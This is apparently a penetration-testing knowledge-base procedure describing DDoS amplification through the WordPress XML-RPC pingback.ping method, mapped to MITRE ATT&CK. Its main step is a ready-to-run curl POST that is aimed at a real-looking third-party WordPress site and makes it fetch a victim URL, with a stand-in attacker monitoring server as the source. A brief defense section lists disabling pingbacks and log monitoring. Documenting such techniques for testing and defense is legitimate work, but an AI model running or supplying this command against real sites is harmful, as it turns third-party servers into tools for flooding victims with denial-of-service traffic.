---
id: proc-ddos-pingback
tags:
  - wordpress
  - xmlrpc
  - ddos
  - amplification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/pingback-dos-amplification]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:30.339Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate-DDoS-via-Pingback

## Summary

This procedure demonstrates how the pingback.ping method in xmlrpc.php can be abused to amplify DDoS attacks by forcing the WordPress site to send requests to a target URL.

## Description

The pingback.ping method notifies the target about a link from a source, but attackers can spoof this to make the server fetch content from a victim site, multiplying traffic. This targets enabled xmlrpc.php on WordPress, leading to botnet incorporation. Requires prior confirmation of endpoint activity.

## Requirements

1. Accessible xmlrpc.php endpoint
2. Control over a monitoring server for source URI
3. Victim URL for amplification testing

## Defense

Defensive measures and detection strategies:

- Disable pingbacks in WordPress settings or via plugins
- Firewall rules to block outbound requests triggered by XML-RPC
- Log analysis for pingback.ping calls with suspicious targets

## Objectives

1. Trigger amplification traffic to a victim
2. Validate DDoS potential
3. Highlight botnet recruitment risk

## Instructions

### Step 1: Send Pingback Request

**Context**: This step abuses pingback.ping by specifying an attacker-controlled source and victim target, causing the server to validate the link and amplify traffic.

**Command** ([[commands/pingback-dos-amplification]]):
```bash
curl -X POST http://www.iandunn.name/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker-server.com/monitored</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>'
```

> This sends a POST with source and target params. Expected output is HTTP 200 with XML success message, followed by outbound HTTP requests from the target to the victim.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/pingback-dos-amplification]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- wordpress
- xmlrpc
- ddos
- amplification
